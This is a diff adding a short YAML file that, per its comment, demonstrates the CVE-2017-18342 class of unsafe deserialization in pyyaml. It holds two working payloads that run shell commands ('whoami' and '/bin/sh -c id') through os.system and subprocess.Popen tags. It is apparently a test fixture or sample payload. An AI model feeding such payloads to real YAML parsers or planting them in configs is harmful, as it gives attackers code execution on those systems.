@@ -1,0 +1,6 @@
+# CVE-2017-18342 family — pyyaml load() executes !!python/object/apply
+# constructs as Python code. js-yaml in unsafe mode and several Ruby YAML
+# parsers have analogous gadgets.
+config:
+  command: !!python/object/apply:os.system ["whoami"]
+  alt: !!python/object/new:subprocess.Popen [["/bin/sh", "-c", "id"]]
